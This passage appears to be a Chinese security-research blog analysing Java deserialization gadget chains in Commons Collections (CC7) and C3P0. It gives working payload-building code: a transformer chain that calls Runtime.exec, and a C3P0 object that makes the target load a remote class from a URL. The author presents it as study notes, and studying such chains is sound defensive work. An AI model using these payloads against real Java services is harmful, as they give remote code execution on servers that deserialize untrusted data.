主要是判断了两个元素的长度是否相同，所以这里必须将put lazymap2时候添加的key和value给手动去掉。
最好在hashtable put前把transformerChain 设成空，这样不会提前执行命令执行链。
###  0x4 payload编写
虽然原理解释了半天，但是在payload编写方面还是挺好写的，主要步骤如下：
  1. 创建两个hashmap和两个Lazymap
  2. 向lazymap中填充以yy和zZ为key的两个键值对
  3. 将两个lazymap put进创建的hashtable中
  4. 修改transformerChain的iTransformers属性为命令执行链
  5. 删除lazyMap2中多余的key
        public static void main(String[] args) throws Exception{
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
            };
            Transformer transformerChain = new ChainedTransformer(new Transformer[] {});
            Map innerMap1 = new HashMap();
            Map innerMap2 = new HashMap();
            Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
            lazyMap1.put("yy", 1);
            Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
            lazyMap2.put("zZ", 1);
            Hashtable hashtable = new Hashtable();
            hashtable.put(lazyMap1, 1);
            hashtable.put(lazyMap2, 1);
            Class tr = transformerChain.getClass();
            Field field = tr.getDeclaredField("iTransformers");
            field.setAccessible(true);
            final Object value = transformers;
            final Object chain = transformerChain;
            field.set(chain,value);
            lazyMap2.remove("yy");
            byte[] serializeData=serialize(hashtable);
            unserialize(serializeData);
        }
完整代码在  
###  0x5 总结
完美利用了hashtable反序列化时会触发元素比较，巧的是lazymap的equals方法是继承父类方法，父类做的操作是用lazymap的innermap进行对比，刚好innermap是hashmap，hashmap的equals方法时继承AbstractMap类，其中有个获取equals方法参数的key，及m.get(key)，
## 0x02 C3P0 反序列化利用分析
C3P0链也是个比较有趣的利用链，主要涉及了PoolBackedDataSourceBase、ConnectionPoolDataSource、Referenceable、ReferenceableUtils、ReferenceIndirector这几个类和接口。粗略看的话类的关系跳来跳去，利用链貌似很复杂，细细的品一品回味无穷，感觉真香。老规矩，从整体链分析构造方法，最后解答几个自己的问题结束。
###  0x1 调用栈分析
    com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase.readObject
    com.mchange.v2.naming.ReferenceIndirector.getObject
    com.mchange.v2.naming.ReferenceableUtils.referenceToObject
整个利用链非常的浅，主要利用的PoolBackedDataSourceBase的readObject函数作为反序列化的入口，最后调用referenceToObject函数触发Class.
_forName动态加载远程类_
###  0x2 反序列化链分析
**1\. readObject 函数分析**
那么首先我们看一看这次的入口函数
在代码的213行出发getObject方法，这个方法是ois.readObject
还原出来的对象。因为IndirectlySerialized为一个借口，所以我们在这里还太知道getObject方法的真正执行者是谁。
只能通过分析序列化的过程看一看第一个封装的对象是谁。如下图所示writeObject方法中的169行，因为connectionPoolDataSource没有继承Serializable接口，所以在这里会直接抛异常进入catch代码段。有意思的事情发生了在oos.writeObject的时候包装了类
粗略的看下这个包装的类，需要执行connectionPoolDataSource对象的getReference方法
**2\. getObject 方法分析**
getObject 方法主要是为了调用ReferenceableUtils的referenceToObject
方法，因此要事先将一些参数准备好，尤其是this.reference
**3\. referenceToObject 方法分析**
最后就到了Class解析的地方，var0为传递过来的this.reference，var4为ClassName，var11为ClassLocation这里即URL，最后通过Class.forName解析远程类。
###  0x3 利用链构造
如何构造这个利用链呢？我们从上述分析来看，connectionPoolDataSource是个非常特殊的存在，它是整个链的纽带和桥梁。从分析来看一旦connectionPoolDataSource构造好了，整个利用链也就完成了。那么connectionPoolDataSource需要满足以下条件
  1. 继承ConnectionPoolDataSource、Referenceable，并简单实现接口中的方法
  2. 重点实现getReference 方法，返回对应的数据
至于原因在问题分析中进行解析。在这里分析ConnectionPoolDataSource接口实现以及getReference方法实现。
    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
            private String className;
            private String url;
            public PoolSource(String className, String url) {
                this.className = className;
                this.url = url;
            }
            @Override
            public Reference getReference() throws NamingException {
                return new Reference("exploit", this.className, this.url);
            }
            @Override
            public PooledConnection getPooledConnection() throws SQLException {
                return null;
            }
            @Override
            public PooledConnection getPooledConnection(String user, String password) throws SQLException {
                return null;
            }
            @Override
            public PrintWriter getLogWriter() throws SQLException {
                return null;
            }
            @Override
            public void setLogWriter(PrintWriter out) throws SQLException {
            }
            @Override
            public void setLoginTimeout(int seconds) throws SQLException {
            }
            @Override
            public int getLoginTimeout() throws SQLException {
                return 0;
            }
            @Override
            public Logger getParentLogger() throws SQLFeatureNotSupportedException {
                return null;
            }
        }
至于为什么getReference，原因很简单在最后的referenceToObject方法中会调用getFactoryClassName和getFactoryClassLocation
获取类名和类的加载URL，然而这两个方法就是Reference类中的。
    new Reference("exploit", this.className, this.url);
之后正常写主函数即可。
        public static void main(String[] args) throws Exception{
            Constructor con = PoolBackedDataSource.class.getDeclaredConstructor(new Class[0]);
            con.setAccessible(true);
            PoolBackedDataSource obj = (PoolBackedDataSource) con.newInstance(new Object[0]);
            Field conData = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
            conData.setAccessible(true);
            conData.set(obj, new PoolSource("Exploit", "http://127.0.0.1:8080/"));        
            byte[] serializeData=serialize(obj);
            unserialize(serializeData);
        }
###  0x4 问题分析
**connectionPoolDataSource的条件由来**
connectionPoolDataSource对象的结构到底是怎么确定的，主要归结为两点  
其一序列化时的参数类型为ConnectionPoolDataSource，因此要实现ConnectionPoolDataSource及其父类的所有接口。
其二序列化时调用了ConnectionPoolDataSource类型转换后的getReference因此要实现Referenceable接口及其getReference方法
最后因为接口中的方法都要实现，所以一些无关紧要的方法可以随意返回
## 0x03 总结
主要学习了CC7和C3P0利用链的原理和构造方式，5.1假期收获颇多，打算接下来有时间好好的总结RMI等远程方法调用的知识。
## 0x04 参考文献